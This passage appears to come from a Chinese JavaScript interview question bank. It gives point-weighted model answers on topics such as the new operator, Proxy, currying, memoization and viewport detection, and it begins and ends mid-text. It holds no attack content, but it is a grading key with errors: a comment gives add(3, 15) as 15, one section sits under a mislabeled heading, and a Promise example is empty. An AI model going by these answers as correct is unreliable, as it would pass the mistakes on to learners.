的区别</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>2：</strong> CommonJS是对模块的浅拷⻉，ES6 Module是对模块的引⽤，即ES6 Module只存只读，不能改变其值，也就是指针指向不能变，类似const</li>\\n<li><strong>2：</strong> import的接⼝是read-only（只读状态），不能修改其变量值。 即不能修改其变量的指针指向，但可以改变变量内部指针指向，可以对commonJS对重新赋值（改变指针指向），但是对ES6 Module赋值会编译报错</li>\\n</ul>\\n<p>注：S6 Module和CommonJS模块的共同点：</p>\\n<p>CommonJS和ES6 Module都可以对引⼊的对象进⾏赋值，即对对象内部属性的值进⾏改变</p>\\n<p><a href=\\"https://juejin.cn/post/7331931937357496354\\">docs</a></p>\\n<h2>new 操作符的实现原理</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>2：</strong> new操作符的执行过程：</li>\\n</ul>\\n<blockquote>\\n<p>（1）首先创建了一个新的空对象</p>\\n<p>（2）设置原型，将对象的原型设置为函数的 prototype 对象</p>\\n<p>（3）让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）</p>\\n<p>（4）判断函数的返回值类型，如果是值类型，返回创建的对象。如果是引用类型，就返回这个引用类型的对象</p>\\n</blockquote>\\n<pre><code class=\\"language-js\\">function objectFactory() {\\n  let newObject = null;\\n  let constructor = Array.prototype.shift.call(arguments);\\n  let result = null;\\n  // 判断参数是否是一个函数\\n  if (typeof constructor !== &quot;function&quot;) {\\n    console.error(&quot;type error&quot;);\\n    return;\\n  }\\n  // 新建一个空对象，对象的原型为构造函数的 prototype 对象\\n  newObject = Object.create(constructor.prototype);\\n  // 将 this 指向新建对象，并执行函数\\n  result = constructor.apply(newObject, arguments);\\n  // 判断返回对象\\n  let flag = result &amp;&amp; (typeof result === &quot;object&quot; || typeof result === &quot;function&quot;);\\n  // 判断返回结果\\n  return flag ? result : newObject;\\n}\\n// 使用方法\\nobjectFactory(构造函数, 初始化参数);\\n</code></pre>\\n</details>\\n\\n<h2>数组的原生方法有哪些？</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。</li>\\n<li><strong>1：</strong> 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。</li>\\n<li><strong>1：</strong> 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。</li>\\n<li><strong>1：</strong> 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。</li>\\n<li><strong>1：</strong> 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。</li>\\n<li><strong>1：</strong> 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法</li>\\n<li><strong>1：</strong> 数组归并方法 reduce() 和 reduceRight() 方法</li>\\n</ul>\\n</details>\\n\\n<h2>bind、call、apply 区别</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> call 和apply 都是为了解决改变 this 的指向。作⽤都是相同的，只是传参的⽅式不同</li>\\n<li><strong>1：</strong> 除了第⼀个参数外，call 可以接收⼀个参数列表，apply 只接受⼀个参数数组</li>\\n</ul>\\n<pre><code class=\\"language-js\\">let a = { value: 1 }\\nfunction\\n  getValue(name, age) {\\n  console.log(name)\\n  console.log(age)\\n  console.log(this.value)\\n}\\ngetValue.call(a, &#39;yck&#39;,&#39;24&#39;)\\ngetValue.apply(a,[&#39;yck&#39;, &#39;24&#39;])\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> bind 和其他两个⽅法作⽤也是⼀致的，只是该⽅法会返回⼀个函数。并且我们可以通过 bind 实现柯⾥化</li>\\n</ul>\\n</details>\\n\\n<h2>== 和 ===区别，什么情况⽤ ==</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> ===⽤于判断两者类型和值是否相同。在开发中，对于后端返回的 code，可以通过 == 去判断</li>\\n</ul>\\n<h2>Proxy 的使用</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>4：</strong> 部分 API</li>\\n</ul>\\n<p><img src=\\"https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3e08a8f141f44148ad6f66c7fdc1ab3e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp\\" alt=\\"\\"></p>\\n<ul>\\n<li><strong>1：</strong> 函数调用的监听</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function fun() {\\n    console.log(&quot;哈哈哈&quot;);\\n}\\n\\nconst objProxy = new Proxy(fun, {\\n    /**\\n     * 拦截对函数的调用的捕获器\\n     * @param target target new Proxy 所代理的 obj（监听的对象）\\n     * @param thisArg 调用函数时绑定的 this 值\\n     * @param argArray 调用函数时传递的参数列表\\n     */\\n    apply(target, thisArg, argArray) {\\n        console.log(&quot;对 fun 函数进行了 apply 的调用。&quot;);\\n        // 调用原始函数，并在其结果前后添加一些内容\\n        target.apply(thisArg, argArray)\\n    },\\n    /**\\n     * 监听 class 时的捕获器\\n     * @param target target new Proxy 所代理的 obj（监听的对象）\\n     * @param argArray new fun() 时传入的参数，例：new fun(1, 2, ...rest)\\n     * @param newTarget 被调用的构造函数。在这里，newTarget 就是 objProxy 本身，因为 objProxy 是一个函数代理\\n     */\\n    construct(target, argArray, newTarget) {\\n        console.log(&quot;对 fun 函数进行了 construct 的调用。&quot;);\\n        return new target(...argArray)\\n    }\\n});\\n\\nobjProxy.apply();\\nnew objProxy();\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> new Proxy 中 receiver 参数的作用</li>\\n</ul>\\n<pre><code class=\\"language-js\\">const obj = {\\n    _name: &quot;里斯&quot;,\\n    age: 16,\\n    get name() {\\n        return this._name;\\n    },\\n    set name(newValue) {\\n        this._name = newValue;\\n    }\\n};\\n\\nconst objProxy = new Proxy(obj, {\\n    /**\\n     * receiver 就是 objProxy 这个代理对象\\n     * receiver 传入 Reflect.get 之后，他就作为 obj 里的 this 了（this 这个时候就改变了）\\n     *\\n     */\\n    get(target, key, receiver) {\\n        console.log(receiver);\\n        /**\\n         * 传入 receiver 后，他被访问了两次\\n         */\\n        return Reflect.get(target, key, receiver);\\n    },\\n    set(target, key, newValue, receiver) {\\n        Reflect.set(target, key, newValue, receiver);\\n    }\\n});\\n\\nobjProxy.name = &quot;哈哈哈&quot;;\\nconsole.log(objProxy.name);\\n</code></pre>\\n</details>\\n\\n<h2>Object.defineProperty 的使用</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>1：</strong> Object.defineProperty 的设计初中不是为了监听对象中属性变化的，而是为了定义访问属性描述符。</p>\\n</li>\\n<li><p><strong>1：</strong> 访问属性描述符包括：configurable、enumerable、writable、value</p>\\n</li>\\n<li><p><strong>1：</strong> 访问属性描述符的方法：Object.getOwnPropertyDescriptor()</p>\\n</li>\\n<li><p><strong>1：</strong> 缺点</p>\\n<p>  ① 一次监听太多的时候，不是很友好</p>\\n<p>  ② 新增、删除的时候，他是无能为力的</p>\\n<p>  ③ 会修改原对象中的属性</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-js\\">const obj = {\\n    name: &quot;里斯&quot;,\\n    age: 16\\n};\\n\\n/**\\n * 监听某个属性\\n */\\n/*\\nObject.defineProperty(obj, &quot;name&quot;, {\\n    set(v) {\\n        console.log(v);\\n        console.log(&quot;监听到 set&quot;);\\n    },\\n    get() {\\n        console.log(&quot;监听到 get&quot;);\\n    }\\n});\\n*/\\n\\n/**\\n * 监听所有的属性\\n */\\nObject.keys(obj).forEach(key =&gt; {\\n    console.log(key);\\n    let value = obj[key];\\n    Object.defineProperty(obj, key, {\\n        set(v) {\\n            console.log(`监听到属性 ${key}，被 set 为 ${v}`);\\n            value = v;\\n        },\\n        get() {\\n            console.log(`监听到属性 ${key} get`);\\n            return value;\\n        }\\n    });\\n});\\n\\n\\nobj.name = &quot;哈哈哈&quot;;\\n\\nconsole.log(obj.name);\\n</code></pre>\\n</details>\\n\\n<h2>作用域链的理解</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<p>注：作用域链是指在 JavaScript 中，当访问一个变量时，JavaScript 引擎会按照一定的顺序在当前作用域以及其上层作用域中查找该变量。这个查找的过程就形成了作用域链。</p>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 数据类型</li>\\n</ul>\\n<pre><code class=\\"language-mermaid\\">graph TD;\\n\\n    A[作用域链] --&gt; B[作用域];\\n    A --&gt; C[词法作用域];\\n    A --&gt; D[作用域链];\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 作用域</li>\\n</ul>\\n<p>作用域即变量（变量作用域又称上下文）和函数生效（能被访问）的区域或集合。它决定了代码区块中变量和其他资源的可见性。\\n例如：</p>\\n<pre><code class=\\"language-js\\">\\nfunction greet() {\\n  var greeting = &#39;Hello World!&#39;;\\n  console.log(greeting);\\n}\\ngreet();\\n\\nconsole.log(greeting);// Uncaught ReferenceError: greeting is not defined\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 全局作用域</li>\\n</ul>\\n<p>任何不在函数中或是大括号中声明的变量，都是在全局作用域下。全局作用域下声明的变量可以在程序的任意位置访问。</p>\\n<pre><code class=\\"language-js\\">// 全局变量\\nvar greeting = &#39;Hello World!&#39;;\\nfunction greet() {\\n  console.log(greeting);\\n}\\n// 打印 &#39;Hello World!&#39;\\ngreet();\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 函数作用域</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function greet() {\\n  var greeting = &#39;Hello World!&#39;;\\n  console.log(greeting);\\n}\\n// 打印 &#39;Hello World!&#39;\\ngreet();\\n// 报错: Uncaught ReferenceError: greeting is not defined\\nconsole.log(greeting);\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 块级作用域</li>\\n</ul>\\n<p>ES6 引入：ES6 引入了let和const关键字，与var关键字不同，在大括号中使用let和const声明的变量存在于块级作用域中。在大括号之外不能访问这些变量。</p>\\n<pre><code class=\\"language-js\\">{\\n  // 块级作用域中的变量\\n  let greeting = &#39;Hello World!&#39;;\\n  var lang = &#39;English&#39;;\\n  console.log(greeting); // Prints &#39;Hello World!&#39;\\n}\\n// 变量 &#39;English&#39;\\nconsole.log(lang);\\n// 报错: Uncaught ReferenceError: greeting is not defined\\nconsole.log(greeting);\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 词法作用域</li>\\n</ul>\\n<p>词法作用域又叫静态作用域，变量在创建时就确定好了其作用域，而非在执行阶段确定。也就是说，在编写代码时作用域就已经确定了，JavaScript 遵循的就是词法作用域</p>\\n<pre><code class=\\"language-js\\">\\nvar a = 2;\\nfunction foo() {\\n  console.log(a);\\n}\\nfunction bar() {\\n  var a = 3;\\n  foo();\\n}\\nbar();\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 作用域链</li>\\n</ul>\\n<p>在 JavaScript 中使用一个变量时，JavaScript 引擎会尝试在当前作用域下去寻找该变量。如果没找到，再到它的上层作用域寻找，以此类推直到找到该变量或是已经到了全局作用域。</p>\\n<p>如果在全局作用域里仍然找不到该变量，它就会在全局范围内隐式声明该变量（非严格模式下）或是直接报错。</p>\\n<pre><code class=\\"language-js\\">\\nvar sex = &#39;男&#39;;\\nfunction person() {\\n    var name = &#39;张三&#39;;\\n    function student() {\\n        var age = 18;\\n        console.log(name); // 张三\\n        console.log(sex); // 男\\n    }\\n    student();\\n    console.log(age); // Uncaught ReferenceError: age is not defined\\n}\\nperson();\\n\\n/*\\nstudent 函数内部：\\n当查找name时，在student函数内部找不到，向上一层作用域（person函数内部）找，找到了输出 “张三”。\\n当查找sex时，在student函数内部找不到，向上一层作用域（person函数内部）找，还找不到继续向上一层找，即全局作用域，找到了输出 “男”。\\n\\nperson 函数内部：\\n当查找age时，在person函数内部找不到，向上一层找，即全局作用域，还是找不到则报错。\\n\\n*/\\n</code></pre>\\n</details>\\n\\n<h2>柯里化</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<p>给函数传递一部分参数来调用这个函数，并且 当前的这个函数他会在返回一个函数，去处理剩余的参数，见下面 示例：</p>\\n<p><img src=\\"/public/images/3_JavaScript_20241224170424.png\\" alt=\\"\\"></p>\\n<p>也就是 拆分函数的参数，这样的就可以叫 柯里化。</p>\\n<ul>\\n<li><strong>1：</strong> 使用函数柯里化的好处？</li>\\n</ul>\\n<p>在函数式的编程中，尽量 让一个函数处理一个问题，尽可能的单一，而不是将一些问题交给一个方法去解决，就好比 react 的函数式组件，你的一个功能组件是经过多个 UI 组件合成而来的一样，所以我们可以将每次传入的参数在，当前函数中处理，在当前函数处理完成后，在下一个函数中在使用上一个函数的处理结果即可。</p>\\n<ul>\\n<li><strong>1：</strong> 例子</li>\\n</ul>\\n<p>实现一个给第一个参数加2，给第二个参数乘2的例子</p>\\n<p><img src=\\"/public/images/3_JavaScript_20241224170632.png\\" alt=\\"\\"></p>\\n<ul>\\n<li><strong>2：</strong> 柯里化函数的实现</li>\\n</ul>\\n<pre><code class=\\"language-js\\">/**\\n * 多参函数 转 柯里化函数\\n */\\nfunction currying(fn) { // 接受一个函数,返回一个函数\\n    // 这里是接受剩余参数\\n    function receivedParameters(...args) {\\n        // 判断当前已经接受到的参数的个数, 和参数本身(这个参数本身就是一个函数)需要接收到参数是否已经一致\\n        // console.log(fn.length);\\n        // console.log(args.length);\\n        // 到传入函数的参数(fn 的参数) 大于 传入的参数(...args)时,就直接调用传入的函数\\n        if (args.length &gt;= fn.length) {\\n            // 这个 apply 是为了方式外面调用时,绑定了this,而导致这个里面执行 fn 时的混乱\\n            return fn.apply(this, args);\\n        } else {\\n            // 当参数不够的时候, 需要返回一个函数,来接续接收传入的参数,所以 在这 就需要把传入的所有参数,进行一次拼接\\n            return function (...smallArgs) {\\n                // 这个里面用了递归,来检查参数 是否达到,达到了,就运行传入的函数(fn)\\n                return receivedParameters.apply(this, [...args, ...smallArgs])\\n            }\\n        }\\n    }\\n    return receivedParameters\\n}\\n\\n// 使用\\nfunction fun(n, m, b) { // fun的参数个数,是可以 通过 fun.length 拿到的\\n    return n + m + b\\n}\\n\\nconst test = currying(fun);\\n\\nconsole.log(test(1, 2, 3));\\nconsole.log(test(1)(2, 3))\\nconsole.log(test(1)(2)(3));\\n</code></pre>\\n</details>\\n\\n<h2>迭代器</h2>\\n<h2>CommonJS和ES6模块的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> Iterator 描述</li>\\n</ul>\\n<p>迭代器（iterator），是确使用户可在容器对象（container，例如链表或数组）上遍访的对象，使用该接口无需关心对象的内部实现细节。</p>\\n<p>注：迭代器可以帮助我们去遍历某个数据结构。</p>\\n<p><a href=\\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Iterators_and_Generators#%E8%BF%AD%E4%BB%A3%E5%99%A8\\">文档</a></p>\\n<ul>\\n<li><strong>2：</strong> 实现一个简单的迭代器</li>\\n</ul>\\n<p>迭代器是一个对象，但是需要符合<a href=\\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE\\">迭代器协议</a>。</p>\\n<p><a href=\\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE\\">文档</a>\\n注：在使用的过程中，根据需求，进行修改。</p>\\n<pre><code class=\\"language-javascript\\">/**\\n * 下面就是一个迭代器\\n * 但是他是毫无作用的\\n */\\n/*\\nconst iterator = {\\n    next: function () {\\n        return {done: true, value: &quot;test&quot;};\\n    }\\n};\\n*/\\n\\n/**\\n * 创建一个迭代器，去访问一个数组\\n * 如果迭代器能够生成序列中的下一个值，则返回 false 布尔值。（这等价于没有指定 done 这个属性。）\\n *\\n * 如果迭代器已将序列迭代完毕，则为 true。这种情况下，value 是可选的，如果它依然存在，即为迭代结束之后的默认返回值。\\n */\\nfunction createArrayIterator(arr) {\\n    let index = 0;\\n    const arrIterator = {\\n        next: function () {\\n            // return {done: false, value: &quot;你好&quot;};\\n            // return {done: false, value: &quot;哈哈&quot;};\\n            // return {done: false, value: &quot;啊啊&quot;};\\n            // return {done: true, value: undefined};\\n            if (index &lt; arr.length) {\\n                return {done: false, value: arr[index++]};\\n            } else {\\n                return {done: true, value: undefined};\\n            }\\n        }\\n    };\\n    return arrIterator;\\n}\\n\\nconst arr1 = [&quot;你好&quot;, &quot;哈哈&quot;, &quot;啊啊&quot;];\\nconst arr1Iterator = createArrayIterator(arr1);\\n\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\n// 前面的都能访问到，后面的就无法访问了\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\n\\nconst arr2 = [1, 2, 3, 4, 5, 6];\\nconst arr2Iterator = createArrayIterator(arr2);\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\n</code></pre>\\n<p> <img src=\\"https://not-have.github.io/file/images/image-20240202230330197.png\\" alt=\\"image-20240202230330197\\"></p>\\n</details>\\n\\n<h2>JS 如何实现函数缓存</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 是什么</li>\\n</ul>\\n<p>就是实用一个对象来存储计算过的结果，当再次调用函数时，先检查结果是否已经存在，如果存在，则直接返回结果，否则再进行计算。\\n本质上是实用空间换时间。\\n常用于缓存数据计算和缓存对象：</p>\\n<pre><code class=\\"language-js\\">const add = (a,b) =&gt; a+b;\\nconst calc = memoize(add); // 函数缓存\\ncalc(10,20);// 30\\ncalc(10,20);// 30 缓存\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 实现</li>\\n</ul>\\n<p>注：函数缓存主要依靠 <code>闭包、柯里化、高阶函数</code></p>\\n<h5>1）闭包</h5>\\n<pre><code class=\\"language-js\\">(function() {\\n    var a = 1; // 在 IIFE (立即调用的函数表达式) 内部定义了变量 a\\n    function add() {\\n        const b = 2; // 在 add 函数内部定义了变量 b\\n        let sum = b + a; // sum 是 add 函数内部的局部变量，b 和 a 都在其作用域内\\n        console.log(sum); // 输出 3\\n    }\\n    \\n    add(); // 调用 add 函数\\n})();\\n</code></pre>\\n<h5>2）柯里化</h5>\\n<pre><code class=\\"language-js\\">// 非函数柯里化\\nvar add = function (x,y) {\\n    return x+y;\\n}\\nadd(3, 15) // 15\\n\\n// 函数柯里化\\nvar add2 = function (x) {\\n    return function (y) {\\n        return x+y;\\n    }\\n}\\nconst str = add2(3)(15) //15\\n\\nconsole.log(`永远喜欢 ${str} 岁的 girl ！！！`);\\n</code></pre>\\n<h5>3）高阶函数</h5>\\n<pre><code class=\\"language-js\\">function foo(){\\n  var a = 2;\\n\\n  function bar() {\\n    console.log(a);\\n  }\\n  return bar;\\n}\\nvar baz = foo();\\nbaz();\\n</code></pre>\\n<h5>4）实现函数缓存</h5>\\n<pre><code class=\\"language-js\\">var add = function (x, y) {\\n    return x + y;\\n}\\n\\n/**\\n * 函数缓存\\n * \\n * @param {*} func 要缓存的函数\\n * @param {*} content 上下文\\n */\\nconst memoize = function (func, content) {\\n  // 创建一个缓存对象，用来存储已计算的结果，避免重复计算\\n  let cache = Object.create(null)\\n\\n  // 如果没有传递 content 参数，则将 content 设置为当前上下文 this\\n  content = content || this\\n  \\n  // 返回一个新的函数，它会接收传入的参数，并进行缓存判断\\n  return (...key) =&gt; {\\n    // 使用 JSON.stringify 将 key 数组转换为字符串，确保相同的参数值被一致缓存\\n    const cacheKey = JSON.stringify(key);\\n\\n    // 检查缓存中是否已经存储了当前参数的计算结果\\n    if (!cache[cacheKey]) {\\n      // 如果缓存中没有，调用 func 并将结果存储在 cache 中\\n      // func.apply(content, key) 用来调用 func，传递 content 作为上下文，key 作为参数\\n      cache[cacheKey] = func.apply(content, key);\\n    }\\n    \\n    // 返回缓存中的结果（如果已计算过）\\n    return cache[cacheKey];\\n  }\\n}\\n\\n/**\\n * 使用\\n */\\nconst calc = memoize(add);\\nconst num1 = calc(100, 200);  // 计算并缓存结果\\nconsole.log(num1);  // 300\\n\\nconst num2 = calc(100, 200);  // 从缓存中获取结果\\nconsole.log(num2);  // 300\\n</code></pre>\\n<h5>5）使用场景</h5>\\n<p>对于昂贵的函数调用，执行复杂计算的函数\\n对于具有有限且高度重复输入范围的函数\\n对于具有重复输入值的递归函数\\n对于纯函数，即每次使用特定输入调用时返回相同输出的函数</p>\\n</details>\\n\\n<h2>CommonJS和ES6模块的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>CommonJS模块是同步加载的，ES6模块是异步加载的。</p>\\n</li>\\n<li><p>CommonJS模块的导出是值的拷贝，ES6模块的导出是值的引用。</p>\\n</li>\\n<li><p>CommonJS模块的导入是动态的，ES6模块的导入是静态的。</p>\\n</li>\\n<li><p>CommonJS模块的导出是函数时，导出的函数是值的拷贝，ES6模块的导出是函数时，导出的函数是值的引用。</p>\\n</li>\\n<li><p>CommonJS模块的导出是对象时，导出的对象是值的拷贝，ES6模块的导出是对象时，导出的对象是值的引用。</p>\\n</li>\\n<li><p>CommonJS模块的导出是类时，导出的类是值的拷贝，ES6模块的导出是类时，导出的类是值的引用。</p>\\n</li>\\n</ul>\\n<h2>介绍一下Promise</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>Promise 是一种用于处理异步操作的 JavaScript 对象。它代表了一个尚未完成但预期将来会完成的操作的结果。</p>\\n<p>Promise 对象有三种状态：</p>\\n<ul>\\n<li><p>Pending（进行中）：初始状态，既不是成功，也不是失败状态。</p>\\n</li>\\n<li><p>Fulfilled（已成功）：意味着操作成功完成。</p>\\n</li>\\n<li><p>Rejected（已失败）：意味着操作失败。</p>\\n</li>\\n</ul>\\n<p>Promise 对象使用 <code>then</code> 方法来处理成功和失败的情况。<code>then</code> 方法接受两个参数：一个用于处理成功情况的回调函数和一个用于处理失败情况的回调函数。</p>\\n<pre><code class=\\"language-js\\">const promise = new Promise((resolve, reject) =&gt; {\\n\\n\\n})\\n</code></pre>\\n<h2>如何判断一个元素是否在可视区域内？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：用途</strong></li>\\n</ul>\\n<p>可视区域即我们浏览网页的设备肉眼可见的区域，如下图</p>\\n<p><img src=\\"/public/images/3_JavaScript_20241230001543.png\\" alt=\\"\\"></p>\\n<p>在日常开发中，我们经常需要判断目标元素是否在视窗之内或者和视窗的距离小于一个值（例如 100 px），从而实现一些常用的功能，例如：</p>\\n<blockquote>\\n<ul>\\n<li>图片的懒加载</li>\\n<li>列表的无限滚动</li>\\n<li>计算广告元素的曝光情况</li>\\n<li>可点击链接的预加载</li>\\n</ul>\\n</blockquote>\\n<ul>\\n<li><strong>实现方式: 3</strong></li>\\n</ul>\\n<h5>1）offsetTop、scrollTop</h5>\\n<p><code>offsetTop</code>，元素的上外边框至包含元素的上内边框之间的像素距离，其他<code>offset</code>属性如下图所示：</p>\\n<p><img src=\\"/public/images/3_JavaScript_20241230001827.png\\" alt=\\"\\"></p>\\n<p>下面再来了解下<code>clientWidth</code>、<code>clientHeight</code>：</p>\\n<ul>\\n<li><code>clientWidth</code>：元素内容区宽度加上左右内边距宽度，即<code>clientWidth = content + padding</code></li>\\n<li><code>clientHeight</code>：元素内容区高度加上上下内边距高度，即<code>clientHeight = content + padding</code></li>\\n</ul>\\n<p>这里可以看到<code>client</code>元素都不包括外边距</p>\\n<p>最后，关于<code>scroll</code>系列的属性如下：</p>\\n<ul>\\n<li><p><code>scrollWidth</code> 和 <code>scrollHeight</code> 主要用于确定元素内容的实际大小</p>\\n</li>\\n<li><p><code>scrollLeft</code> 和 <code>scrollTop</code> 属性既可以确定元素当前滚动的状态，也可以设置元素的滚动位置</p>\\n</li>\\n<li><p>垂直滚动 <code>scrollTop &gt; 0</code></p>\\n</li>\\n<li><p>水平滚动 <code>scrollLeft &gt; 0</code></p>\\n</li>\\n<li><p>将元素的 <code>scrollLeft</code> 和 <code>scrollTop</code> 设置为 0，可以重置元素的滚动位置</p>\\n</li>\\n</ul>\\n<h5>注意</h5>\\n<ul>\\n<li>上述属性都是只读的，每次访问都要重新开始</li>\\n</ul>\\n<p>下面再看看如何实现判断：</p>\\n<p>公式如下：</p>\\n<pre><code class=\\"language-js\\">el.offsetTop - document.documentElement.scrollTop &lt;= viewPortHeight\\n</code></pre>\\n<p>代码实现：</p>\\n<pre><code class=\\"language-js\\">function isInViewPortOfOne (el) {\\n    // viewPortHeight 兼容所有浏览器写法\\n    const viewPortHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight \\n    const offsetTop = el.offsetTop\\n    const scrollTop = document.documentElement.scrollTop\\n    const top = offsetTop - scrollTop\\n    return top &lt;= viewPortHeight\\n}\\n</code></pre>\\n<h5>2）getBoundingClientRect</h5>\\n<p>返回值是一个 <code>DOMRect</code>对象，拥有<code>left</code>, <code>top</code>, <code>right</code>, <code>bottom</code>, <code>x</code>, <code>y</code>, <code>width</code>, 和 <code>height</code>属性</p>\\n<pre><code class=\\"language-js\\">const target = document.querySelector(&#39;.target&#39;);\\nconst clientRect = target.getBoundingClientRect();\\nconsole.log(clientRect);\\n\\n// {\\n//   bottom: 556.21875,\\n//   height: 393.59375,\\n//   left: 333,\\n//   right: 1017,\\n//   top: 162.625,\\n//   width: 684\\n// }\\n</code></pre>\\n<p>属性对应的关系图如下所示：</p>\\n<p><img src=\\"/public/images/3_JavaScript_20241230002050.png\\" alt=\\"\\"></p>\\n<p>当页面发生滚动的时候，<code>top</code>与<code>left</code>属性值都会随之改变</p>\\n<p>如果一个元素在视窗之内的话，那么它一定满足下面四个条件：</p>\\n<ul>\\n<li>top 大于等于 0</li>\\n<li>left 大于等于 0</li>\\n<li>bottom 小于等于视窗高度</li>\\n<li>right 小于等于视窗宽度</li>\\n</ul>\\n<p>实现代码如下：</p>\\n<pre><code class=\\"language-js\\">function isInViewPort(element) {\\n  const viewWidth = window.innerWidth || document.documentElement.clientWidth;\\n  const viewHeight = window.innerHeight || document.documentElement.clientHeight;\\n  const {\\n    top,\\n    right,\\n    bottom,\\n    left,\\n  } = element.getBoundingClientRect();\\n\\n  return (\\n    top &gt;= 0 &amp;&amp;\\n    left &gt;= 0 &amp;&amp;\\n    right &lt;= viewWidth &amp;&amp;\\n    bottom &lt;= viewHeight\\n  );\\n}\\n</code></pre>\\n<h5>3）Intersection Observer</h5>\\n<p><code>Intersection Observer</code> 即重叠观察者，从这个命名就可以看出它用于判断两个元素是否重叠，因为不用进行事件的监听，性能方面相比 <code>getBoundingClientRect</code> 